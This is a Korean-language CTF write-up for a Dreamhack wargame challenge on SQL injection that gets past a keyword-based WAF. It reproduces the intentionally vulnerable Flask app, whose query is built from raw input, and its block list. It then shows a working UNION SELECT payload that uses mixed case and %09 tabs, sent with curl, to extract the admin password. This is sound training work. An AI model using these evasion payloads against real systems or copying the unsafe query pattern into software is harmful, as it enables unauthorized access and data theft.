# [Dreamhack Wargame] sql injection bypass WAF
### [🚩sql injection bypass WAF](https://dreamhack.io/wargame/challenges/415/)
  <img width="1066" alt="bypassWAF_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/0029cadb-7918-48f3-be90-ea17b8a503e0">

<br/><br/>

## 문제 파일 분석
### init.sql
```sql
CREATE DATABASE IF NOT EXISTS `users`; -- users 데이터베이스가 존재하지 않을 경우 CREATE DATABASE로 생성함
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass'; -- 권한 설정

USE `users`;
CREATE TABLE user( -- CREATE TABLE로 user 테이블 생성 (열: idx, uid, upw)
  idx int auto_increment primary key, -- auto_increment (시작값은 1, 새로운 행이 추가될 때마다 1씩 자동 증가)
  uid varchar(128) not null,
  upw varchar(128) not null
);

-- user 테이블에 INSERT INTO 구문을 통해 adcde, admin, guest, test, dream 계정과 각 계정의 비밀번호를 삽입함
INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
* init.sql 실행 결과로 생성된 users 데이터베이스의 user 테이블
    | idx(primary key) | uid | upw |
    |:-----:|-----:|-----:|
    | 1 | 'adcde' | '12345' |
    | 2 | 'admin' | 플래그 |
    | 3 | 'guest' | 'guest' |
    | 4 | 'test' | 'test' |
    | 5 | 'dream' | 'hack' |

<br/>

### app.py
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

# Flask와 mysql을 이용한 웹 서버가 동작하고 있음
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''


keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/'] # 필터링할 키워드 목록
def check_WAF(data): # 필터링 함수 (목록에 포함된 키워드들이 존재하는지 검사함)
    for keyword in keywords:
        if keyword in data: # 필터링 키워드가 존재할 경우 True 반환
            return True
    return False # 필터링 키워드가 존재하지 않을 경우 False 반환


# 인덱스 페이지
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid') # 이용자가 전달한 uid 인자값을 가져옴
    if uid: # 이용자의 입력값이 존재하는 경우 (?uid= 다음에 입력이 존재함)
        # 필터링할 키워드가 포함되어 있는지 검사하여 존재할 경우 WAF에 의해 요청이 막혔다는 메세지를 출력함
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        
        # 필터링 키워드가 요청에 포함되지 않을 경우 아래의 코드를 실행함
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';") # uid를 이용해 user 테이블을 조회하는 쿼리문을 생성하고 실행함
        result = cur.fetchone()
        
        if result: # 결과는 조건에 해당하는 행 전체를 반환함 (행의 idx, uid, upw)
            return template.format(uid=uid, result=result[1]) # 반환되는 결과 중 두 번째에 해당하는 uid를 화면에 출력함
        else: # 결과가 존재하지 않을 경우
            return template.format(uid=uid, result='')

    else:
        return template # template 변수의 내용을 그대로 출력함


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
특정 필터링 키워드가 포함되어 있는지 검사한 후, 해당 검사를 통과하면 이용자가 전달한 uid가 mysql 쿼리에 삽입되어 실행되기 때문에 필터링 함수를 우회하면 SQL Injection을 수행할 수 있음
* ```check_WAF``` 함수에 의해 keywords 리스트에 포함된 문자인 ```union```, ```select```, ```from```, ```and```, ```or```, ```admin```, ``` ```, ```/*```, ```/```이 필터링됨
    | 필터링 종류 | 설명 |
    |:----:|---------|
    | ```union```, ```select```, ```from```, ```and```, ```or```, ```admin``` | 키워드 검사 코드를 보면 리스트에 포함된 키워드들만 검사함 → 대소문자를 혼용하는 방식으로 이 필터링을 우회할 수 있음 |
    | ``` ```, ```/*```, ```/``` | 공백 문자와 공백 문자를 대신할 수 있는 주석(```/**/```)과 개행(```/n```)을 필터링하고 있음 → 주석과 개행 외에도 공백 문자를 대신할 수 있는 문자를 사용해 이 필터링을 우회함 <br/> &nbsp;&nbsp; 📌 Tab(0x09)를 URL 인코딩한 값인 ```%09```를 이용해 공백 검사를 우회할 수 있음 |
* "admin" 계정의 패스워드를 획득할 수 있는 uid 입력값
    | 일반 문자열로 나타낸 uid | 필터링 검사를 우회하기 위한 uid 입력값(URL Encode) |
    |----|----|
    | ```' UNION SELECT uid, upw, idx FROM user WHERE uid='admin' -- ``` | ```'%09Union%09SelecT%09uid,upw,idx%09FrOm%09user%09Where%09uid='Admin'%09--%09```|

     <img width="1543" alt="URL_Encoding" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/fb4577a3-3a15-4701-8712-6a75c71f33c9"><br/>
    - 결과를 출력하는 코드를 보면 조건으로 준 ```uid```에 해당하는 모든 컬럼을 가져와 그 중 두 번째 결과를 화면에 출력하고 있음 → UNION 문은 컬럼의 수가 일치해야 하므로 SELECT 다음에 작성하는 열의 순서에서 upw를 두 번째에 위치시킴
    - 이후 공백을 ```%09```로 대체, 각 키워드는 대소문자를 혼용하여 사용함으로써 필터링 검사를 우회함
    
        
<br/><br/>

### 익스플로잇
1. 터미널에서 리눅스 명령어 ```curl```를 사용하여 다음과 같이 입력함
    ```
    curl "http://host3.dreamhack.games:19977/?uid='%09Union%09SelecT%09uid,upw,idx%09FrOm%09user%09Where%09uid='Admin'%09--%09"
    ```

2. 결과를 보면 template 변수의 ```<pre>{result}<pre>``` 부분에 admin 계정의 비밀번호인 플래그가 출력된 것을 볼 수 있음
    <img width="892" alt="bypassWAF_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/0ca881a2-6e9b-4ede-b882-263e4161b7e0">
